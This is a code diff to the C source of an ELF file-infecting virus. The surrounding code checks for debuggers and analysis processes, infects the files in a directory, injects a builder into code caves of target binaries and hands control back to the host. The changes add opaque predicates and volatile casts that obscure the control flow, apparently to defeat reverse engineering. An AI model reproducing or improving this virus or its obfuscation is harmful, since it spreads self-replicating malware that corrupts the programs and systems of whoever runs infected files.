@@ -92,6 +92,11 @@ always_true(int x) {
     return ((x * x) % 2) == ((x * (x + 1)) % 2);
 }
 
+__attribute__((always_inline)) inline int
+always_false(int x) {
+    return ((x * x) % 2) == 1 + ((x * (x + 1)) % 2);
+}
+
 __attribute__((always_inline)) inline void
 ft_strcat(volatile char *dst, volatile char *src) {
     while (*dst) {
@@ -333,7 +338,7 @@ _start() {
         ft_exit(0);
     };
 
-    if (always_true(9398) && (in_debugger() || bad_process_running())) {
+    if (always_true((volatile int)9398) && (in_debugger() || bad_process_running())) {
         jump_back(fd_self);
     }
 
@@ -349,7 +354,7 @@ _start() {
     dir[8] = 't';
     dir[9] = '\0';
 
-    if (always_true(9391128) && infect_dir(dir, fd_self)) jump_back(fd_self);
+    if (always_true((volatile int)9391128) && infect_dir(dir, fd_self)) jump_back(fd_self);
 
     jump_back(fd_self);
 }
@@ -412,13 +417,13 @@ infect_file(volatile char *path, volatile File *file_self) {
     };
 
     const uint8_t target_has_signature = ft_strnstr(file_target.mem, signatur, file_target.size);
-    if (target_has_signature) {
+    if (always_true((volatile int)1) && target_has_signature) {
         file_munmap(&file_target);
         ft_close(fd_target);
         return 0;
     }
 
-    if (elf64_ident_check((Elf64_Ehdr *)file_target.mem)) {
+    if (!always_false((volatile int)321) && elf64_ident_check((Elf64_Ehdr *)file_target.mem)) {
         file_munmap(&file_target);
         ft_close(fd_target);
         return 0;
@@ -440,7 +445,7 @@ infect_file(volatile char *path, volatile File *file_self) {
     uint64_t needed_space_table = code_caves_target_num * 16;
     uint64_t needed_space = entries_size_sum(entries_self, entries_self_num) + needed_space_table;
 
-    if (provided_space < needed_space) {
+    if (provided_space < needed_space || always_false((volatile size_t)&needed_space)) {
         file_munmap(&file_target);
         ft_close(fd_target);
         return 0;
@@ -449,7 +454,7 @@ infect_file(volatile char *path, volatile File *file_self) {
     uint64_t builder_target_start_offset = reserve_builder(&file_target, builder_self_start, builder_self_size, code_caves_target, code_caves_target_num);
     uint8_t not_enough_space_for_builder = builder_target_start_offset == 0;
 
-    if (not_enough_space_for_builder) {
+    if (not_enough_space_for_builder || !always_true((volatile size_t)&_start)) {
         file_munmap(&file_target);
         ft_close(fd_target);
         return 0;
